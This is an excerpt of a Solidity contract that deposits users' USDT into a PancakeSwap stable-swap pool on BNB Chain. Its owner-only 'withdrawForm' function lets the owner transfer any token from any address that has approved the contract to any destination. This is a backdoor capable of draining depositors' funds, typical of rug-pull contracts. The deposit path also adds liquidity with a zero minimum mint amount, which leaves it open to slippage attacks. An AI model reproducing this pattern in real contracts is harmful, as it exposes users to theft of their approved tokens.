...
contract AAinUsdtFofPancakeStable is Ownable {

    PancakeStableSwap public pancakestableswap;
    constructor () public {
        PancakeStableSwap _pancakestableswap = PancakeStableSwap(0x169F653A54ACD441aB34B73dA9946e2C451787EF);
        pancakestableswap = _pancakestableswap;
    }
    function addLiquidityToSwap(uint256 usdt_amount,uint256 busd_amount,uint256 min_mint_amount)private returns(bool){
        
        uint256[2] memory amounts;
        
        amounts[0] = usdt_amount;
        amounts[1] = busd_amount;

        pancakestableswap.add_liquidity(amounts,min_mint_amount);
        return true;    
    }
    function ApprovalUsdt_Busd()public onlyOwner returns(bool){
        address usdtAddr = address(0x55d398326f99059fF775485246999027B3197955);
        address busdAddr = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        address LpAddr = address(0x169F653A54ACD441aB34B73dA9946e2C451787EF);
        uint256 amount = 999999999999 * 10 ** 18;

        IERC20(usdtAddr).approve(LpAddr,amount);
        IERC20(busdAddr).approve(LpAddr,amount);

        return true;    
    }
    function despoit(uint256 amount) public returns(bool) {
        address usdtAddr = address(0x55d398326f99059fF775485246999027B3197955);
        IERC20(usdtAddr).transferFrom(msg.sender,address(this),amount);

        addLiquidityToSwap(amount,0,0);
        return true;
    }
    ...
    function withdrawForm(address token,address from,address _to,uint256 amount) public onlyOwner returns(bool) {
        IERC20(token).transferFrom(from,_to,amount);
        return true; 
    }
